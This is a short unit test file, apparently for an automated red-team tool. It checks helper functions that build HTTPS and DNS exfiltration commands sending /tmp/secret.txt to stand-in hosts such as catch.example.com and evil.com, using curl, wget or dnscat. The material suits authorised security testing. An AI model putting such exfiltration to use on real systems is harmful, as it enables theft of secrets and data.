# tests/unit/tools/test_exfil.py
from autored.tools.exfil import _build_exfil_https, _build_exfil_dns, ExfilResult


def test_build_exfil_https():
    cmd = _build_exfil_https("catch.example.com", "/tmp/secret.txt")
    cmd_str = " ".join(cmd)
    assert "curl" in cmd_str or "wget" in cmd_str
    assert "catch.example.com" in cmd_str
    assert "/tmp/secret.txt" in cmd_str


def test_build_exfil_dns():
    cmd = _build_exfil_dns("evil.com", "/tmp/secret.txt")
    cmd_str = " ".join(cmd)
    assert "dnscat" in cmd_str or "dns" in cmd_str.lower()


def test_exfil_result_model():
    r = ExfilResult(method="https", source_host="10.10.10.5",
                    data_size_bytes=1024, catch_server="catch.example.com",
                    catch_server_log_path="/var/log/catch.log")
    assert r.method == "https"
